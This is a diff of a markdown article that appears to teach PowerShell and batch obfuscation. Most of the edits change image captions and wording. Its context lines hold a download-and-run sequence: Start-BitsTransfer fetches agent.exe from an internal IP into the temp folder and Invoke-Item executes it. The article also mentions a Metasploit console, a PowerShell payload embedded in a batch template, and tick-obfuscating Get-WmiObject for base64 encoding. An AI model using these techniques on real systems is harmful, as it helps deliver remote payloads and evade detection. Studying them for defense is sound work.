@@ -565,9 +565,12 @@ The above string can be obfuscated using **powershell special characters:** **`*
       Import-Module BitsTransfer
       $path = [environment]::getfolderpath("temp")
       Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$path\agent.exe"
+
+![powershell obfuscation Start-BitsTransfer](http://i.)
+
       Invoke-Item "$path\agent.exe"
 
-![powershell obfuscation](http://i.)
+![powershell obfuscation Invoke-item-msfconsole](http://i.)
 
 ---
 
@@ -782,7 +785,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
       Its never to late to remmenber that diferent technics can be combined together to achieve
       better results. The next example shows one powershell (psh-cmd) payload embbebed into one
-      template.bat using 5 diferent batch obfuscation technics found in this article (only batch technics)
+      template.bat using 5 diferent batch obfuscation technics found in this article (only batch)
 
 <br />
 
@@ -802,7 +805,7 @@ Here we can view the all process of encoding/decoding in powershell console
 - String command to obfuscate<br />
 `Get-WmiObject`
 
-- String to be transformed into base64<br />
+- Tick String to be transformed into base64<br />
 
       G`et-Wm`iOb`ject
 
